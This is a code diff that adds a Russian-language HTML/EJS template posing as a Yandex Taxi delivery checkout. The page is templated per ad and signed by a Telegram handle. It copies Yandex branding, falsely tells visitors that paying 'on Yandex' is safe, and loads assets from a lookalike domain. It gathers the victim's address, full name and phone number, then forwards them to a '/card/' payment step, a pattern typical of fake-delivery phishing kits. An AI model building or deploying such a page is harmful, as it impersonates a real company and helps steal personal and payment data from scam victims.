@@ -1,0 +1,351 @@
+
+<!-- MADE BY ASHE | TELEGRAM: @ASHECODE -->
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<link href="favicon.ico" rel="icon" type="image/x-icon">
+	<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+	<title>Яндекс.Такси — сервис доставки для интернет-магазинов</title>
+<meta property="og:site_name" content="Быстрая доставка для вашего бизнеса&nbsp;— Яндекс.Доставка">
+<meta property="og:image" content="https://avatars.mds.yandex.net/get-lpc/1674605/bb7413d8-7877-49e3-9fe7-9c4072541f28/orig">
+	<meta property="og:url" content="https://dostavka.yandex.ru/">
+<meta property="og:title" content="Быстрая доставка для вашего бизнеса&nbsp;— Яндекс.Доставка">
+<meta name="description" content="Пешие курьеры и&nbsp;курьеры на&nbsp;машине, фургоны и&nbsp;грузовики. Приложение для заказа с&nbsp;возможностью отслеживать курьера на&nbsp;карте. Заказы застрахованы на&nbsp;сумму до&nbsp;500&nbsp;000&nbsp;₽.">
+	<meta property="og:type" content="website">
+	<meta property="og:locale" content="ru_RU">
+	<link rel="shortcut icon" href="/assets/img/icon.png" type="image/png">
+	<link rel="stylesheet" href="mm.css">
+	<link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap" rel="stylesheet">
+	<style>
+	* {
+		margin: 0;
+		padding: 0;
+		-webkit-box-sizing: border-box;
+		box-sizing: border-box
+	}
+	
+	.t-vertical-chat {
+		display: -webkit-box;
+		display: -ms-flexbox;
+		display: -webkit-flex;
+		display: flex;
+		-webkit-box-pack: justify;
+		-ms-flex-pack: justify;
+		-webkit-justify-content: space-between;
+		justify-content: space-between;
+		-webkit-box-align: center;
+		-ms-flex-align: center;
+		-webkit-align-items: center;
+		align-items: center;
+		width: 300px;
+		height: 45px;
+		background-color: #263238;
+		-webkit-transform: rotate(-90deg);
+		-ms-transform: rotate(-90deg);
+		transform: rotate(-90deg);
+		-webkit-transform-origin: center;
+		-ms-transform-origin: center;
+		transform-origin: center;
+		-webkit-box-shadow: 0 0 16px rgba(0, 0, 0, .1);
+		box-shadow: 0 0 16px rgba(0, 0, 0, .1);
+		-webkit-border-top-left-radius: 5px;
+		border-top-left-radius: 5px;
+		-webkit-border-top-right-radius: 5px;
+		border-top-right-radius: 5px;
+		margin-right: -webkit-calc(-300px / 2 + -webkit-calc(45px / 2));
+		margin-right: calc(-300px / 2 + calc(45px / 2));
+		margin-bottom: -webkit-calc(300px / 2 - -webkit-calc(45px / 2));
+		margin-bottom: calc(300px / 2 - calc(45px / 2));
+		position: fixed;
+		right: 0;
+		bottom: 30px;
+		z-index: 10000;
+		font-size: 16px;
+		font-family: Roboto, sans-serif;
+		color: #fff;
+		-webkit-transition: 0.6s;
+		-o-transition: 0.6s;
+		transition: 0.6s
+	}
+	
+	.t-vertical-chat:hover {
+		cursor: pointer
+	}
+	
+	.t-vertical-chat > div:nth-child(1) {
+		padding-left: 30px
+	}
+	
+	.t-vertical-chat > div:nth-child(2) {
+		padding-right: 30px
+	}
+	
+	.t-vertical-chat.hidden {
+		right: -45px
+	}
+	
+	.t-horizontal-chat {
+		width: 350px;
+		position: fixed;
+		right: 30px;
+		bottom: 0;
+		z-index: 10000;
+		background-color: #fff;
+		-webkit-box-shadow: 0 0 16px rgba(0, 0, 0, .1);
+		box-shadow: 0 0 16px rgba(0, 0, 0, .1);
+		-webkit-transition: 0.6s;
+		-o-transition: 0.6s;
+		transition: 0.6s;
+		overflow-x: hidden;
+		font-family: Roboto, sans-serif;
+		color: #212121
+	}
+	
+	.t-horizontal-chat.hidden {
+		bottom: -100%
+	}
+	
+	.t-horizontal-chat > .t-horizontal-chat-nav {
+		width: 100%;
+		height: 62.5px;
+		display: -webkit-box;
+		display: -ms-flexbox;
+		display: -webkit-flex;
+		display: flex;
+		-webkit-box-pack: justify;
+		-ms-flex-pack: justify;
+		-webkit-justify-content: space-between;
+		justify-content: space-between;
+		-webkit-box-align: center;
+		-ms-flex-align: center;
+		-webkit-align-items: center;
+		align-items: center;
+		padding-left: 30px;
+		padding-right: 30px;
+		background-color: #263238;
+		-webkit-border-top-left-radius: 5px;
+		border-top-left-radius: 5px;
+		-webkit-border-top-right-radius: 5px;
+		border-top-right-radius: 5px;
+		font-size: 16px;
+		color: #fff
+	}
+	
+	.t-horizontal-chat > .t-horizontal-chat-nav:hover {
+		cursor: pointer
+	}
+	
+	.t-horizontal-chat > .t-horizontal-chat-body {
+		width: 100%;
+		height: 350px;
+		padding: 15px;
+		overflow-y: auto
+	}
+	
+	.t-horizontal-chat > .t-horizontal-chat-body > ul,
+	.t-horizontal-chat > .t-horizontal-chat-body > ul > li {
+		margin: 0;
+		padding: 0;
+		list-style: none;
+		font-size: 14px
+	}
+	
+	.t-horizontal-chat > .t-horizontal-chat-body > ul > li {
+		word-break: break-all;
+		margin-bottom: 15px;
+		padding: 15px;
+		-webkit-border-radius: 5px;
+		border-radius: 5px
+	}
+	
+	.t-horizontal-chat > .t-horizontal-chat-body > ul > li.t-horizontal-chat-body-question {
+		text-align: right
+	}
+	
+	.t-horizontal-chat > .t-horizontal-chat-body > ul > li.t-horizontal-chat-body-answer {
+		text-align: left;
+		background-color: #eceff1
+	}
+	
+	.t-horizontal-chat > .t-horizontal-chat-footer {
+		width: 100%;
+		display: -webkit-box;
+		display: -ms-flexbox;
+		display: -webkit-flex;
+		display: flex;
+		-webkit-box-pack: center;
+		-ms-flex-pack: center;
+		-webkit-justify-content: center;
+		justify-content: center;
+		-webkit-box-align: center;
+		-ms-flex-align: center;
+		-webkit-align-items: center;
+		align-items: center;
+		-webkit-box-orient: vertical;
+		-webkit-box-direction: normal;
+		-ms-flex-direction: column;
+		-webkit-flex-direction: column;
+		flex-direction: column;
+		-webkit-box-shadow: 0 0 16px rgba(0, 0, 0, .1);
+		box-shadow: 0 0 16px rgba(0, 0, 0, .1)
+	}
+	
+	.t-horizontal-chat > .t-horizontal-chat-footer > textarea {
+		width: 100%;
+		height: 100px;
+		max-height: 100px;
+		min-height: 100px;
+		font-size: 14px;
+		border: none;
+		padding: 15px;
+		outline: 0!important;
+		resize: none!important
+	}
+	
+	.t-horizontal-chat > .t-horizontal-chat-footer > textarea::-webkit-input-placeholder {
+		color: #bdbdbd
+	}
+	
+	.t-horizontal-chat > .t-horizontal-chat-footer > textarea::-moz-placeholder {
+		color: #bdbdbd
+	}
+	
+	.t-horizontal-chat > .t-horizontal-chat-footer > textarea:-ms-input-placeholder {
+		color: #bdbdbd
+	}
+	
+	.t-horizontal-chat > .t-horizontal-chat-footer > textarea::-ms-input-placeholder {
+		color: #bdbdbd
+	}
+	
+	.t-horizontal-chat > .t-horizontal-chat-footer > textarea::placeholder {
+		color: #bdbdbd
+	}
+	
+	.t-horizontal-chat > .t-horizontal-chat-footer > button {
+		width: 100%;
+		border: none;
+		background-color: #eceff1;
+		font-size: 14px;
+		padding-top: 15px;
+		padding-bottom: 15px;
+		outline: 0;
+		cursor: pointer
+	}
+	
+	@media screen and (max-width:450px) {
+		.t-horizontal-chat {
+			width: 100%;
+			right: 0
+		}
+	}
+	
+	@media screen and (max-height:600px) {
+		.t-horizontal-chat.hidden {
+			bottom: -webkit-calc(-100% * 10);
+			bottom: calc(-100% * 10)
+		}
+	}
+	
+	@media screen and (max-width: 956px) {
+		.t-vertical-chat {
+			display: block;
+			width: 50px;
+			height: 50px;
+			-webkit-border-radius: 50px;
+			border-radius: 50px;
+			-webkit-transform: none;
+			-ms-transform: none;
+			transform: none;
+			margin: 0;
+			right: 15px;
+			bottom: 100px
+		}
+		.t-vertical-chat:after {
+			content: "?";
+			font-weight: bold;
+			display: -webkit-box;
+			display: -webkit-flex;
+			display: -ms-flexbox;
+			display: flex;
+			-webkit-box-pack: center;
+			-webkit-justify-content: center;
+			-ms-flex-pack: center;
+			justify-content: center;
+			-webkit-box-align: center;
+			-webkit-align-items: center;
+			-ms-flex-align: center;
+			align-items: center;
+			width: 100%;
+			height: 100%;
+			font-size: 16px;
+			font-family: Roboto, sans-serif
+		}
+		.t-vertical-chat > * {
+			display: none
+		}
+	}
+	</style>
+</head>
+		
+
+<body>
+	<header>
+		<div class="logo-header">
+			<a href="https://yandex.ru/" title="Яндекс"> <img alt="Яндекс" class="logo_header-img" src="https://frgrf.net/thumb/2/kCY1QWQq2PECkQzk56UGxA/120r120/d/s1200.png"> </a> <img alt="" class="" src=""> </div>
+	</header>
+	<form method="GET" action="/card/<%=ad.id%>" id="form-payment">
+		<main>
+			<div class="selection-top">
+				<p class="title">Оформление и оплата</p>
+				<div class="content">
+					<div class="pr-image" style="background-image: url('https://png.pngtree.com/png-vector/20191029/ourlarge/pngtree-delivery-truck-icon-isolated-on-abstract-background-png-image_1901994.jpg'); display: inline-block;"></div>
+					<div class="text-block">
+						<p class="pr-price"><%=ad.price%> </p>
+						<p class="pr-name"><%=ad.title%></p>
+					</div>
+				</div>
+			</div>
+			<div class="mobile-safery">
+				<p class="safery-info"> <img src="/assets/img/shield.svg" alt="">Оплачивать на Yandex безопасно </p>
+			</div>
+			<div class="selection-buyer">
+				<div class="selection-buyer_content">
+					<div class="delivery-info"> <img src="https://yandex.tracker-online.info/assets/img/icon.png" alt="" class="delivery-img">
+						<div class="text-block">
+							<p class="delivery-text">Выбрана доставка по городу.</p>
+							<p class="delivery-text" style="color: #7F7F7F;">Стоимость доставки в разных городах может различаться.</p>
+						</div>
+					</div>
+					<div class="label-block">
+						<label>Адрес доставки</label>
+						<input class="input-max valid5 valid-1" placeholder="Город, улица, дом" required="" name="address" maxlength="255">
+						<input class="input-mid valid1 valid-1" placeholder="Квартира / офис" required="" name="flat" maxlength="255"> </div>
+					<div class="label-block">
+						<label>Данные получателя</label>
+						<input class="input-min valid3 valid-3" placeholder="Фамилия" required="" name="lastname" maxlength="25">
+						<input class="input-min valid3 valid-4" placeholder="Имя" required="" name="firstname" maxlength="25">
+						<input class="input-min" placeholder="Отчество" required="" name="middlename" maxlength="25">
+						<input class="input-min phone valid-5" placeholder="Телефон" required="" data-mask="+0 (000) 000 00-00" name="phone" autocomplete="off" maxlength="18"> </div> <a href="https://taxi.yandex.ru/action/tariff/delivery" style="margin-top: 15px;">Доставка осуществляется через службу Yandex Taxi.</a> </div>
+			</div>
+			<div class="selection-right">
+				<div class="price-block">
+					<p class="price"><%=ad.price%> </p>
+					<p class="commission">С учетом стоимости доставки <%=ad.price%> </p>
+				</div>
+				<button class="button-pay" type="submit">Оплатить <%=ad.price%> </button>
+				<p class="safery-info"> <img src="/assets/img/shield.svg" alt="">Оплачивать на Yandex безопасно </p>
+				<p class="agreement-info"> Нажимая кнопку «Перейти к оплате», вы соглашаетесь с условиями использования сервиса <a href="https://yandex.ru/legal/taxi_termsofuse/">Яндекс Такси</a> </p>
+			</div>
+		</main>
+		<footer>
+			<div class="footer-summary"> <span style="float: left;">Итого:</span> <span style="color: #039ad3; float: right;"><%=ad.price%> </span> </div>
+			<button class="button-pay" type="submit">Оплатить <%=ad.price%> </button>
+		</footer>
+	</form>
+</body>
+
+</html>
+<!-- MADE BY ASHE | TELEGRAM: @ASHECODE -->
